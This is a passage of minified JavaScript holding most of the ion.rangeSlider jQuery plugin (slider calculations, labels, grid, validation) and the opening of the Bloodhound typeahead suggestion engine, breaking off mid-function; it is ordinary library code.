restoreOriginalMinInterval: function () { null !== this.old_min_interval && (this.options.min_interval = this.old_min_interval, this.old_min_interval = null) }, calc: function (t) { if (this.options && (this.calc_count++, 10 !== this.calc_count && !t || (this.calc_count = 0, this.coords.w_rs = this.$cache.rs.outerWidth(!1), this.calcHandlePercent()), this.coords.w_rs)) { this.calcPointerPercent(); var e = this.getHandleX(); switch ("both" === this.target && (this.coords.p_gap = 0, e = this.getHandleX()), "click" === this.target && (this.coords.p_gap = this.coords.p_handle / 2, e = this.getHandleX(), this.options.drag_interval ? this.target = "both_one" : this.target = this.chooseHandle(e)), this.target) { case "base": var n = (this.options.max - this.options.min) / 100, i = (this.result.from - this.options.min) / n, o = (this.result.to - this.options.min) / n; this.coords.p_single_real = this.toFixed(i), this.coords.p_from_real = this.toFixed(i), this.coords.p_to_real = this.toFixed(o), this.coords.p_single_real = this.checkDiapason(this.coords.p_single_real, this.options.from_min, this.options.from_max), this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max), this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max), this.coords.p_single_fake = this.convertToFakePercent(this.coords.p_single_real), this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real), this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real), this.target = null; break; case "single": if (this.options.from_fixed) break; this.coords.p_single_real = this.convertToRealPercent(e), this.coords.p_single_real = this.calcWithStep(this.coords.p_single_real), this.coords.p_single_real = this.checkDiapason(this.coords.p_single_real, this.options.from_min, this.options.from_max), this.coords.p_single_fake = this.convertToFakePercent(this.coords.p_single_real); break; case "from": if (this.options.from_fixed) break; this.coords.p_from_real = this.convertToRealPercent(e), this.coords.p_from_real = this.calcWithStep(this.coords.p_from_real), this.coords.p_from_real > this.coords.p_to_real && (this.coords.p_from_real = this.coords.p_to_real), this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max), this.coords.p_from_real = this.checkMinInterval(this.coords.p_from_real, this.coords.p_to_real, "from"), this.coords.p_from_real = this.checkMaxInterval(this.coords.p_from_real, this.coords.p_to_real, "from"), this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real); break; case "to": if (this.options.to_fixed) break; this.coords.p_to_real = this.convertToRealPercent(e), this.coords.p_to_real = this.calcWithStep(this.coords.p_to_real), this.coords.p_to_real < this.coords.p_from_real && (this.coords.p_to_real = this.coords.p_from_real), this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max), this.coords.p_to_real = this.checkMinInterval(this.coords.p_to_real, this.coords.p_from_real, "to"), this.coords.p_to_real = this.checkMaxInterval(this.coords.p_to_real, this.coords.p_from_real, "to"), this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real); break; case "both": if (this.options.from_fixed || this.options.to_fixed) break; e = this.toFixed(e + .001 * this.coords.p_handle), this.coords.p_from_real = this.convertToRealPercent(e) - this.coords.p_gap_left, this.coords.p_from_real = this.calcWithStep(this.coords.p_from_real), this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max), this.coords.p_from_real = this.checkMinInterval(this.coords.p_from_real, this.coords.p_to_real, "from"), this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real), this.coords.p_to_real = this.convertToRealPercent(e) + this.coords.p_gap_right, this.coords.p_to_real = this.calcWithStep(this.coords.p_to_real), this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max), this.coords.p_to_real = this.checkMinInterval(this.coords.p_to_real, this.coords.p_from_real, "to"), this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real); break; case "both_one": if (this.options.from_fixed || this.options.to_fixed) break; var a = this.convertToRealPercent(e), s = this.result.from_percent, r = this.result.to_percent - s, g = r / 2, l = a - g, c = a + g; l < 0 && (c = (l = 0) + r), 100 < c && (l = (c = 100) - r), this.coords.p_from_real = this.calcWithStep(l), this.coords.p_from_real = this.checkDiapason(this.coords.p_from_real, this.options.from_min, this.options.from_max), this.coords.p_from_fake = this.convertToFakePercent(this.coords.p_from_real), this.coords.p_to_real = this.calcWithStep(c), this.coords.p_to_real = this.checkDiapason(this.coords.p_to_real, this.options.to_min, this.options.to_max), this.coords.p_to_fake = this.convertToFakePercent(this.coords.p_to_real) }"single" === this.options.type ? (this.coords.p_bar_x = this.coords.p_handle / 2, this.coords.p_bar_w = this.coords.p_single_fake, this.result.from_percent = this.coords.p_single_real, this.result.from = this.convertToValue(this.coords.p_single_real), this.result.from_pretty = this._prettify(this.result.from), this.options.values.length && (this.result.from_value = this.options.values[this.result.from])) : (this.coords.p_bar_x = this.toFixed(this.coords.p_from_fake + this.coords.p_handle / 2), this.coords.p_bar_w = this.toFixed(this.coords.p_to_fake - this.coords.p_from_fake), this.result.from_percent = this.coords.p_from_real, this.result.from = this.convertToValue(this.coords.p_from_real), this.result.from_pretty = this._prettify(this.result.from), this.result.to_percent = this.coords.p_to_real, this.result.to = this.convertToValue(this.coords.p_to_real), this.result.to_pretty = this._prettify(this.result.to), this.options.values.length && (this.result.from_value = this.options.values[this.result.from], this.result.to_value = this.options.values[this.result.to])), this.calcMinMax(), this.calcLabels() } }, calcPointerPercent: function () { this.coords.w_rs ? (this.coords.x_pointer < 0 || isNaN(this.coords.x_pointer) ? this.coords.x_pointer = 0 : this.coords.x_pointer > this.coords.w_rs && (this.coords.x_pointer = this.coords.w_rs), this.coords.p_pointer = this.toFixed(this.coords.x_pointer / this.coords.w_rs * 100)) : this.coords.p_pointer = 0 }, convertToRealPercent: function (t) { return t / (100 - this.coords.p_handle) * 100 }, convertToFakePercent: function (t) { return t / 100 * (100 - this.coords.p_handle) }, getHandleX: function () { var t = 100 - this.coords.p_handle, e = this.toFixed(this.coords.p_pointer - this.coords.p_gap); return e < 0 ? e = 0 : t < e && (e = t), e }, calcHandlePercent: function () { "single" === this.options.type ? this.coords.w_handle = this.$cache.s_single.outerWidth(!1) : this.coords.w_handle = this.$cache.s_from.outerWidth(!1), this.coords.p_handle = this.toFixed(this.coords.w_handle / this.coords.w_rs * 100) }, chooseHandle: function (t) { return "single" === this.options.type ? "single" : this.coords.p_from_real + (this.coords.p_to_real - this.coords.p_from_real) / 2 <= t ? this.options.to_fixed ? "from" : "to" : this.options.from_fixed ? "to" : "from" }, calcMinMax: function () { this.coords.w_rs && (this.labels.p_min = this.labels.w_min / this.coords.w_rs * 100, this.labels.p_max = this.labels.w_max / this.coords.w_rs * 100) }, calcLabels: function () { this.coords.w_rs && !this.options.hide_from_to && ("single" === this.options.type ? (this.labels.w_single = this.$cache.single.outerWidth(!1), this.labels.p_single_fake = this.labels.w_single / this.coords.w_rs * 100, this.labels.p_single_left = this.coords.p_single_fake + this.coords.p_handle / 2 - this.labels.p_single_fake / 2) : (this.labels.w_from = this.$cache.from.outerWidth(!1), this.labels.p_from_fake = this.labels.w_from / this.coords.w_rs * 100, this.labels.p_from_left = this.coords.p_from_fake + this.coords.p_handle / 2 - this.labels.p_from_fake / 2, this.labels.p_from_left = this.toFixed(this.labels.p_from_left), this.labels.p_from_left = this.checkEdges(this.labels.p_from_left, this.labels.p_from_fake), this.labels.w_to = this.$cache.to.outerWidth(!1), this.labels.p_to_fake = this.labels.w_to / this.coords.w_rs * 100, this.labels.p_to_left = this.coords.p_to_fake + this.coords.p_handle / 2 - this.labels.p_to_fake / 2, this.labels.p_to_left = this.toFixed(this.labels.p_to_left), this.labels.p_to_left = this.checkEdges(this.labels.p_to_left, this.labels.p_to_fake), this.labels.w_single = this.$cache.single.outerWidth(!1), this.labels.p_single_fake = this.labels.w_single / this.coords.w_rs * 100, this.labels.p_single_left = (this.labels.p_from_left + this.labels.p_to_left + this.labels.p_to_fake) / 2 - this.labels.p_single_fake / 2, this.labels.p_single_left = this.toFixed(this.labels.p_single_left)), this.labels.p_single_left = this.checkEdges(this.labels.p_single_left, this.labels.p_single_fake)) }, updateScene: function () { this.raf_id && (cancelAnimationFrame(this.raf_id), this.raf_id = null), clearTimeout(this.update_tm), this.update_tm = null, this.options && (this.drawHandles(), this.is_active ? this.raf_id = requestAnimationFrame(this.updateScene.bind(this)) : this.update_tm = setTimeout(this.updateScene.bind(this), 300)) }, drawHandles: function () { this.coords.w_rs = this.$cache.rs.outerWidth(!1), this.coords.w_rs && (this.coords.w_rs !== this.coords.w_rs_old && (this.target = "base", this.is_resize = !0), this.coords.w_rs === this.coords.w_rs_old && !this.force_redraw || (this.setMinMax(), this.calc(!0), this.drawLabels(), this.options.grid && (this.calcGridMargin(), this.calcGridLabels()), this.force_redraw = !0, this.coords.w_rs_old = this.coords.w_rs, this.drawShadow()), this.coords.w_rs && (this.dragging || this.force_redraw || this.is_key) && ((this.old_from !== this.result.from || this.old_to !== this.result.to || this.force_redraw || this.is_key) && (this.drawLabels(), this.$cache.bar[0].style.left = this.coords.p_bar_x + "%", this.$cache.bar[0].style.width = this.coords.p_bar_w + "%", "single" === this.options.type ? (this.$cache.bar[0].style.left = 0, this.$cache.bar[0].style.width = this.coords.p_bar_w + this.coords.p_bar_x + "%", this.$cache.s_single[0].style.left = this.coords.p_single_fake + "%") : (this.$cache.s_from[0].style.left = this.coords.p_from_fake + "%", this.$cache.s_to[0].style.left = this.coords.p_to_fake + "%", this.old_from === this.result.from && !this.force_redraw || (this.$cache.from[0].style.left = this.labels.p_from_left + "%"), this.old_to === this.result.to && !this.force_redraw || (this.$cache.to[0].style.left = this.labels.p_to_left + "%")), this.$cache.single[0].style.left = this.labels.p_single_left + "%", this.writeToInput(), this.old_from === this.result.from && this.old_to === this.result.to || this.is_start || (this.$cache.input.trigger("change"), this.$cache.input.trigger("input")), this.old_from = this.result.from, this.old_to = this.result.to, this.is_resize || this.is_update || this.is_start || this.is_finish || this.callOnChange(), (this.is_key || this.is_click) && (this.is_key = !1, this.is_click = !1, this.callOnFinish()), this.is_update = !1, this.is_resize = !1, this.is_finish = !1), this.is_start = !1, this.is_key = !1, this.is_click = !1, this.force_redraw = !1)) }, drawLabels: function () { var t, e, n, i, o, a, s, r, g, l, c; this.options && (t = this.options.values.length, e = this.options.p_values, this.options.hide_from_to || ("single" === this.options.type ? (n = t ? this.decorate(e[this.result.from]) : (a = this._prettify(this.result.from), this.decorate(a, this.result.from)), this.$cache.single.html(n), this.calcLabels(), this.labels.p_single_left < this.labels.p_min + 1 ? this.$cache.min[0].style.visibility = "hidden" : this.$cache.min[0].style.visibility = "visible", this.labels.p_single_left + this.labels.p_single_fake > 100 - this.labels.p_max - 1 ? this.$cache.max[0].style.visibility = "hidden" : this.$cache.max[0].style.visibility = "visible") : (o = t ? (this.options.decorate_both ? (n = this.decorate(e[this.result.from]), n += this.options.values_separator, n += this.decorate(e[this.result.to])) : n = this.decorate(e[this.result.from] + this.options.values_separator + e[this.result.to]), i = this.decorate(e[this.result.from]), this.decorate(e[this.result.to])) : (a = this._prettify(this.result.from), s = this._prettify(this.result.to), this.options.decorate_both ? (n = this.decorate(a, this.result.from), n += this.options.values_separator, n += this.decorate(s, this.result.to)) : n = this.decorate(a + this.options.values_separator + s, this.result.to), i = this.decorate(a, this.result.from), this.decorate(s, this.result.to)), this.$cache.single.html(n), this.$cache.from.html(i), this.$cache.to.html(o), this.calcLabels(), r = Math.min(this.labels.p_single_left, this.labels.p_from_left), g = this.labels.p_single_left + this.labels.p_single_fake, l = this.labels.p_to_left + this.labels.p_to_fake, c = Math.max(g, l), this.labels.p_from_left + this.labels.p_from_fake >= this.labels.p_to_left ? (this.$cache.from[0].style.visibility = "hidden", this.$cache.to[0].style.visibility = "hidden", this.$cache.single[0].style.visibility = "visible", c = this.result.from === this.result.to ? ("from" === this.target ? this.$cache.from[0].style.visibility = "visible" : "to" === this.target ? this.$cache.to[0].style.visibility = "visible" : this.target || (this.$cache.from[0].style.visibility = "visible"), this.$cache.single[0].style.visibility = "hidden", l) : (this.$cache.from[0].style.visibility = "hidden", this.$cache.to[0].style.visibility = "hidden", this.$cache.single[0].style.visibility = "visible", Math.max(g, l))) : (this.$cache.from[0].style.visibility = "visible", this.$cache.to[0].style.visibility = "visible", this.$cache.single[0].style.visibility = "hidden"), r < this.labels.p_min + 1 ? this.$cache.min[0].style.visibility = "hidden" : this.$cache.min[0].style.visibility = "visible", c > 100 - this.labels.p_max - 1 ? this.$cache.max[0].style.visibility = "hidden" : this.$cache.max[0].style.visibility = "visible"))) }, drawShadow: function () { var t, e, n, i, o = this.options, a = this.$cache, s = "number" == typeof o.from_min && !isNaN(o.from_min), r = "number" == typeof o.from_max && !isNaN(o.from_max), g = "number" == typeof o.to_min && !isNaN(o.to_min), l = "number" == typeof o.to_max && !isNaN(o.to_max); "single" === o.type ? o.from_shadow && (s || r) ? (t = this.convertToPercent(s ? o.from_min : o.min), e = this.convertToPercent(r ? o.from_max : o.max) - t, t = this.toFixed(t - this.coords.p_handle / 100 * t), e = this.toFixed(e - this.coords.p_handle / 100 * e), t += this.coords.p_handle / 2, a.shad_single[0].style.display = "block", a.shad_single[0].style.left = t + "%", a.shad_single[0].style.width = e + "%") : a.shad_single[0].style.display = "none" : (o.from_shadow && (s || r) ? (t = this.convertToPercent(s ? o.from_min : o.min), e = this.convertToPercent(r ? o.from_max : o.max) - t, t = this.toFixed(t - this.coords.p_handle / 100 * t), e = this.toFixed(e - this.coords.p_handle / 100 * e), t += this.coords.p_handle / 2, a.shad_from[0].style.display = "block", a.shad_from[0].style.left = t + "%", a.shad_from[0].style.width = e + "%") : a.shad_from[0].style.display = "none", o.to_shadow && (g || l) ? (n = this.convertToPercent(g ? o.to_min : o.min), i = this.convertToPercent(l ? o.to_max : o.max) - n, n = this.toFixed(n - this.coords.p_handle / 100 * n), i = this.toFixed(i - this.coords.p_handle / 100 * i), n += this.coords.p_handle / 2, a.shad_to[0].style.display = "block", a.shad_to[0].style.left = n + "%", a.shad_to[0].style.width = i + "%") : a.shad_to[0].style.display = "none") }, writeToInput: function () { "single" === this.options.type ? (this.options.values.length ? this.$cache.input.prop("value", this.result.from_value) : this.$cache.input.prop("value", this.result.from), this.$cache.input.data("from", this.result.from)) : (this.options.values.length ? this.$cache.input.prop("value", this.result.from_value + this.options.input_values_separator + this.result.to_value) : this.$cache.input.prop("value", this.result.from + this.options.input_values_separator + this.result.to), this.$cache.input.data("from", this.result.from), this.$cache.input.data("to", this.result.to)) }, callOnStart: function () { this.writeToInput(), this.options.onStart && "function" == typeof this.options.onStart && (this.options.scope ? this.options.onStart.call(this.options.scope, this.result) : this.options.onStart(this.result)) }, callOnChange: function () { this.writeToInput(), this.options.onChange && "function" == typeof this.options.onChange && (this.options.scope ? this.options.onChange.call(this.options.scope, this.result) : this.options.onChange(this.result)) }, callOnFinish: function () { this.writeToInput(), this.options.onFinish && "function" == typeof this.options.onFinish && (this.options.scope ? this.options.onFinish.call(this.options.scope, this.result) : this.options.onFinish(this.result)) }, callOnUpdate: function () { this.writeToInput(), this.options.onUpdate && "function" == typeof this.options.onUpdate && (this.options.scope ? this.options.onUpdate.call(this.options.scope, this.result) : this.options.onUpdate(this.result)) }, toggleInput: function () { this.$cache.input.toggleClass("irs-hidden-input"), this.has_tab_index ? this.$cache.input.prop("tabindex", -1) : this.$cache.input.removeProp("tabindex"), this.has_tab_index = !this.has_tab_index }, convertToPercent: function (t, e) { var n, i = this.options.max - this.options.min, o = i / 100; return i ? (n = (e ? t : t - this.options.min) / o, this.toFixed(n)) : (this.no_diapason = !0, 0) }, convertToValue: function (t) { var e, n, i = this.options.min, o = this.options.max, a = i.toString().split(".")[1], s = o.toString().split(".")[1], r = 0, g = 0; if (0 === t) return this.options.min; if (100 === t) return this.options.max; a && (r = e = a.length), s && (r = n = s.length), e && n && (r = n <= e ? e : n), i < 0 && (i = +(i + (g = Math.abs(i))).toFixed(r), o = +(o + g).toFixed(r)); var l, c = (o - i) / 100 * t + i, I = this.options.step.toString().split(".")[1], c = I ? +c.toFixed(I.length) : (c /= this.options.step, +(c *= this.options.step).toFixed(0)); return g && (c -= g), (l = I ? +c.toFixed(I.length) : this.toFixed(c)) < this.options.min ? l = this.options.min : l > this.options.max && (l = this.options.max), l }, calcWithStep: function (t) { var e = Math.round(t / this.coords.p_step) * this.coords.p_step; return 100 < e && (e = 100), 100 === t && (e = 100), this.toFixed(e) }, checkMinInterval: function (t, e, n) { var i, o, a = this.options; return a.min_interval ? (i = this.convertToValue(t), o = this.convertToValue(e), "from" === n ? o - i < a.min_interval && (i = o - a.min_interval) : i - o < a.min_interval && (i = o + a.min_interval), this.convertToPercent(i)) : t }, checkMaxInterval: function (t, e, n) { var i, o, a = this.options; return a.max_interval ? (i = this.convertToValue(t), o = this.convertToValue(e), "from" === n ? o - i > a.max_interval && (i = o - a.max_interval) : i - o > a.max_interval && (i = o + a.max_interval), this.convertToPercent(i)) : t }, checkDiapason: function (t, e, n) { var i = this.convertToValue(t), o = this.options; return "number" != typeof e && (e = o.min), "number" != typeof n && (n = o.max), i < e && (i = e), n < i && (i = n), this.convertToPercent(i) }, toFixed: function (t) { return +(t = t.toFixed(20)) }, _prettify: function (t) { return this.options.prettify_enabled ? this.options.prettify && "function" == typeof this.options.prettify ? this.options.prettify(t) : this.prettify(t) : t }, prettify: function (t) { return t.toString().replace(/(\d{1,3}(?=(?:\d\d\d)+(?!\d)))/g, "$1" + this.options.prettify_separator) }, checkEdges: function (t, e) { return this.options.force_edges && (t < 0 ? t = 0 : 100 - e < t && (t = 100 - e)), this.toFixed(t) }, validate: function () { var t, e, n = this.options, i = this.result, o = n.values, a = o.length; if ("string" == typeof n.min && (n.min = +n.min), "string" == typeof n.max && (n.max = +n.max), "string" == typeof n.from && (n.from = +n.from), "string" == typeof n.to && (n.to = +n.to), "string" == typeof n.step && (n.step = +n.step), "string" == typeof n.from_min && (n.from_min = +n.from_min), "string" == typeof n.from_max && (n.from_max = +n.from_max), "string" == typeof n.to_min && (n.to_min = +n.to_min), "string" == typeof n.to_max && (n.to_max = +n.to_max), "string" == typeof n.grid_num && (n.grid_num = +n.grid_num), n.max < n.min && (n.max = n.min), a) for (n.p_values = [], n.min = 0, n.max = a - 1, n.step = 1, n.grid_num = n.max, n.grid_snap = !0, e = 0; e < a; e++)t = +o[e], t = isNaN(t) ? o[e] : (o[e] = t, this._prettify(t)), n.p_values.push(t); "number" == typeof n.from && !isNaN(n.from) || (n.from = n.min), "number" == typeof n.to && !isNaN(n.to) || (n.to = n.max), "single" === n.type ? (n.from < n.min && (n.from = n.min), n.from > n.max && (n.from = n.max)) : (n.from < n.min && (n.from = n.min), n.from > n.max && (n.from = n.max), n.to < n.min && (n.to = n.min), n.to > n.max && (n.to = n.max), this.update_check.from && (this.update_check.from !== n.from && n.from > n.to && (n.from = n.to), this.update_check.to !== n.to && n.to < n.from && (n.to = n.from)), n.from > n.to && (n.from = n.to), n.to < n.from && (n.to = n.from)), ("number" != typeof n.step || isNaN(n.step) || !n.step || n.step < 0) && (n.step = 1), "number" == typeof n.from_min && n.from < n.from_min && (n.from = n.from_min), "number" == typeof n.from_max && n.from > n.from_max && (n.from = n.from_max), "number" == typeof n.to_min && n.to < n.to_min && (n.to = n.to_min), "number" == typeof n.to_max && n.from > n.to_max && (n.to = n.to_max), i && (i.min !== n.min && (i.min = n.min), i.max !== n.max && (i.max = n.max), (i.from < i.min || i.from > i.max) && (i.from = n.from), (i.to < i.min || i.to > i.max) && (i.to = n.to)), ("number" != typeof n.min_interval || isNaN(n.min_interval) || !n.min_interval || n.min_interval < 0) && (n.min_interval = 0), ("number" != typeof n.max_interval || isNaN(n.max_interval) || !n.max_interval || n.max_interval < 0) && (n.max_interval = 0), n.min_interval && n.min_interval > n.max - n.min && (n.min_interval = n.max - n.min), n.max_interval && n.max_interval > n.max - n.min && (n.max_interval = n.max - n.min) }, decorate: function (t, e) { var n = "", i = this.options; return i.prefix && (n += i.prefix), n += t, i.max_postfix && (i.values.length && t === i.p_values[i.max] || e === i.max) && (n += i.max_postfix, i.postfix && (n += " ")), i.postfix && (n += i.postfix), n }, updateFrom: function () { this.result.from = this.options.from, this.result.from_percent = this.convertToPercent(this.result.from), this.result.from_pretty = this._prettify(this.result.from), this.options.values && (this.result.from_value = this.options.values[this.result.from]) }, updateTo: function () { this.result.to = this.options.to, this.result.to_percent = this.convertToPercent(this.result.to), this.result.to_pretty = this._prettify(this.result.to), this.options.values && (this.result.to_value = this.options.values[this.result.to]) }, updateResult: function () { this.result.min = this.options.min, this.result.max = this.options.max, this.updateFrom(), this.updateTo() }, appendGrid: function () { if (this.options.grid) { var t, e, n, i, o, a, s = this.options, r = s.max - s.min, g = s.grid_num, l = 0, c = 4, I = ""; for (this.calcGridMargin(), s.grid_snap && (g = r / s.step), 50 < g && (g = 50), n = this.toFixed(100 / g), 4 < g && (c = 3), 7 < g && (c = 2), 14 < g && (c = 1), 28 < g && (c = 0), t = 0; t < g + 1; t++) { for (i = c, 100 < (l = this.toFixed(n * t)) && (l = 100), o = ((this.coords.big[t] = l) - n * (t - 1)) / (i + 1), e = 1; e <= i && 0 !== l; e++)I += '<span class="irs-grid-pol small" style="left: ' + this.toFixed(l - o * e) + '%"></span>'; I += '<span class="irs-grid-pol" style="left: ' + l + '%"></span>', a = this.convertToValue(l), I += '<span class="irs-grid-text js-grid-text-' + t + '" style="left: ' + l + '%">' + (a = s.values.length ? s.p_values[a] : this._prettify(a)) + "</span>" } this.coords.big_num = Math.ceil(g + 1), this.$cache.cont.addClass("irs-with-grid"), this.$cache.grid.html(I), this.cacheGridLabels() } }, cacheGridLabels: function () { for (var t, e = this.coords.big_num, n = 0; n < e; n++)t = this.$cache.grid.find(".js-grid-text-" + n), this.$cache.grid_labels.push(t); this.calcGridLabels() }, calcGridLabels: function () { for (var t, e = [], n = [], i = this.coords.big_num, o = 0; o < i; o++)this.coords.big_w[o] = this.$cache.grid_labels[o].outerWidth(!1), this.coords.big_p[o] = this.toFixed(this.coords.big_w[o] / this.coords.w_rs * 100), this.coords.big_x[o] = this.toFixed(this.coords.big_p[o] / 2), e[o] = this.toFixed(this.coords.big[o] - this.coords.big_x[o]), n[o] = this.toFixed(e[o] + this.coords.big_p[o]); for (this.options.force_edges && (e[0] < -this.coords.grid_gap && (e[0] = -this.coords.grid_gap, n[0] = this.toFixed(e[0] + this.coords.big_p[0]), this.coords.big_x[0] = this.coords.grid_gap), n[i - 1] > 100 + this.coords.grid_gap && (n[i - 1] = 100 + this.coords.grid_gap, e[i - 1] = this.toFixed(n[i - 1] - this.coords.big_p[i - 1]), this.coords.big_x[i - 1] = this.toFixed(this.coords.big_p[i - 1] - this.coords.grid_gap))), this.calcGridCollision(2, e, n), this.calcGridCollision(4, e, n), o = 0; o < i; o++)t = this.$cache.grid_labels[o][0], this.coords.big_x[o] !== Number.POSITIVE_INFINITY && (t.style.marginLeft = -this.coords.big_x[o] + "%") }, calcGridCollision: function (t, e, n) { for (var i, o, a = this.coords.big_num, s = 0; s < a && !(a <= (i = s + t / 2)); s += t)o = this.$cache.grid_labels[i][0], n[s] <= e[i] ? o.style.visibility = "visible" : o.style.visibility = "hidden" }, calcGridMargin: function () { this.options.grid_margin && (this.coords.w_rs = this.$cache.rs.outerWidth(!1), this.coords.w_rs && ("single" === this.options.type ? this.coords.w_handle = this.$cache.s_single.outerWidth(!1) : this.coords.w_handle = this.$cache.s_from.outerWidth(!1), this.coords.p_handle = this.toFixed(this.coords.w_handle / this.coords.w_rs * 100), this.coords.grid_gap = this.toFixed(this.coords.p_handle / 2 - .1), this.$cache.grid[0].style.width = this.toFixed(100 - this.coords.p_handle) + "%", this.$cache.grid[0].style.left = this.coords.grid_gap + "%")) }, update: function (t) { this.input && (this.is_update = !0, this.options.from = this.result.from, this.options.to = this.result.to, this.update_check.from = this.result.from, this.update_check.to = this.result.to, this.options = g.extend(this.options, t), this.validate(), this.updateResult(t), this.toggleInput(), this.remove(), this.init(!0)) }, reset: function () { this.input && (this.updateResult(), this.update()) }, destroy: function () { this.input && (this.toggleInput(), this.$cache.input.prop("readonly", !1), g.data(this.input, "ionRangeSlider", null), this.remove(), this.input = null, this.options = null) } }, g.fn.ionRangeSlider = function (t) { return this.each(function () { g.data(this, "ionRangeSlider") || g.data(this, "ionRangeSlider", new a(this, t, i++)) }) }, function () { for (var a = 0, t = ["ms", "moz", "webkit", "o"], e = 0; e < t.length && !c.requestAnimationFrame; ++e)c.requestAnimationFrame = c[t[e] + "RequestAnimationFrame"], c.cancelAnimationFrame = c[t[e] + "CancelAnimationFrame"] || c[t[e] + "CancelRequestAnimationFrame"]; c.requestAnimationFrame || (c.requestAnimationFrame = function (t, e) { var n = (new Date).getTime(), i = Math.max(0, 16 - (n - a)), o = c.setTimeout(function () { t(n + i) }, i); return a = n + i, o }), c.cancelAnimationFrame || (c.cancelAnimationFrame = function (t) { clearTimeout(t) }) }() }), function (e, n) { "function" == typeof define && define.amd ? define("bloodhound", ["jquery"], function (t) { return e.Bloodhound = n(t) }) : "object" == typeof exports ? module.exports = n(require("jquery")) : e.Bloodhound = n(jQuery) }(this, function (c) { var I = function () { "use strict"; return { isMsie: function () { return !!/(msie|trident)/i.test(navigator.userAgent) && navigator.userAgent.match(/(msie |rv:)(\d+(.\d+)?)/i)[2] }, isBlankString: function (t) { return !t || /^\s*$/.test(t) }, escapeRegExChars: function (t) { return t.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&") }, isString: function (t) { return "string" == typeof t }, isNumber: function (t) { return "number" == typeof t }, isArray: c.isArray, isFunction: c.isFunction, isObject: c.isPlainObject, isUndefined: function (t) { return void 0 === t }, isElement: function (t) { return !(!t || 1 !== t.nodeType) }, isJQuery: function (t) { return t instanceof c }, toStr: function (t) { return I.isUndefined(t) || null === t ? "" : t + "" }, bind: c.proxy, each: function (t, n) { c.each(t, function (t, e) { return n(e, t) }) }, map: c.map, filter: c.grep, every: function (n, i) { var o = !0; return n ? (c.each(n, function (t, e) { if (!(o = i.call(null, e, t, n))) return !1 }), !!o) : o }, some: function (n, i) { var o = !1; return n ? (c.each(n, function (t, e) { if (o = i.call(null, e, t, n)) return !1 }), !!o) : o }, mixin: c.extend, identity: function (t) { return t }, clone: function (t) { return c.extend(!0, {}, t) }, getIdGenerator: function () { var t = 0; return function () { return t++ } }, templatify: function (t) { return c.isFunction(t) ? t : function () { return String(t) } }, defer: function (t) { setTimeout(t, 0) }, debounce: function (o, a, s) { var r, g; return function () { var t = this, e = arguments, n = function () { r = null, s || (g = o.apply(t, e)) }, i = s && !r; return clearTimeout(r), r = setTimeout(n, a), i && (g = o.apply(t, e)), g } }, throttle: function (n, i) { var o, a, s, r, g = 0, l = function () { g = new Date, s = null, r = n.apply(o, a) }; return function () { var t = new Date, e = i - (t - g); return o = this, a = arguments, e <= 0 ? (clearTimeout(s), s = null, g = t, r = n.apply(o, a)) : s = s || setTimeout(l, e), r } }, stringify: function (t) { return I.isString(t) ? t : JSON.stringify(t) }, noop: function () { } } }(), n = function () { "use strict"; return { nonword: e, whitespace: t, obj: { nonword: n(e), whitespace: n(t) } }; function t(t) { return (t = I.toStr(t)) ? t.split(/\s+/) : [] } function e(t) { return (t = I.toStr(t)) ? t.split(/\W+/) : [] } function n(i) { return function (t) { return t = I.isArray(t) ? t : [].slice.call(arguments, 0), function (e) { var n = []; return I.each(t, function (t) { n = n.concat(i(I.toStr(e[t]))) }), n } } } }(), i = function () { "use strict"; function t(t) { this.maxSize = I.isNumber(t) ? t : 100, this.reset(), this.maxSize <= 0 && (this.set = this.get = c.noop) } function e() { this.head = this.tail = null } function o(t, e) { this.key = t, this.val = e, this.prev = this.next = null } return I.mixin(t.prototype, { set: function (t, e) { var n, i = this.list.tail; this.size >= this.maxSize && (this.list.remove(i), delete this.hash[i.key], this.size--), (n = this.hash[t]) ? (n.val = e, this.list.moveToFront(n)) : (n = new o(t, e), this.list.add(n), this.hash[t] = n, this.size++) }, get: function (t) { var e = this.hash[t]; if (e) return this.list.moveToFront(e), e.val }, reset: function () { this.size = 0, this.hash = {}, this.list = new e } }), I.mixin(e.prototype, { add: function (t) { this.head && (t.next = this.head, this.head.prev = t), this.head = t, this.tail = this.tail || t }, remove: function (t) { t.prev ? t.prev.next = t.next : this.head = t.next, t.next ? t.next.prev = t.prev : this.tail = t.prev }, moveToFront: function (t) { this.remove(t), this.add(t) } }), t }(), e = function () { "use strict"; var a; try { (a = window.localStorage).setItem("~~~", "!"), a.removeItem("~~~") } catch (t) { a = null } function t(t, e) { this.prefix = ["__", t, "__"].join(""), this.ttlKey = "__ttl__", this.keyMatcher = new RegExp("^" + I.escapeRegExChars(this.prefix)), this.ls = e || a, this.ls || this._noop() } return I.mixin(t.prototype, { _prefix: function (t) { return this.prefix + t }, _ttlKey: function (t) { return this._prefix(t) + this.ttlKey }, _noop: function () { this.get = this.set = this.remove = this.clear = this.isExpired = I.noop }, _safeSet: function (t, e) { try { this.ls.setItem(t, e) } catch (t) { "QuotaExceededError" === t.name && (this.clear(), this._noop()) } }, get: function (t) { return this.isExpired(t) && this.remove(t), n(this.ls.getItem(this._prefix(t))) }, set: function (t, e, n) { return I.isNumber(n) ? this._safeSet(this._ttlKey(t), o(i() + n)) : this.ls.removeItem(this._ttlKey(t)), this._safeSet(this._prefix(t), o(e)) }, remove: function (t) { return this.ls.removeItem(this._ttlKey(t)), this.ls.removeItem(this._prefix(t)), this }, clear: function () { for (var t = function (t) { var e, n, i = [], o = a.length; for (e = 0; e < o; e++)(n = a.key(e)).match(t) && i.push(n.replace(t, "")); return i }(this.keyMatcher), e = t.length; e--;)this.remove(t[e]); return this }, isExpired: function (t) { var e = n(this.ls.getItem(this._ttlKey(t))); return 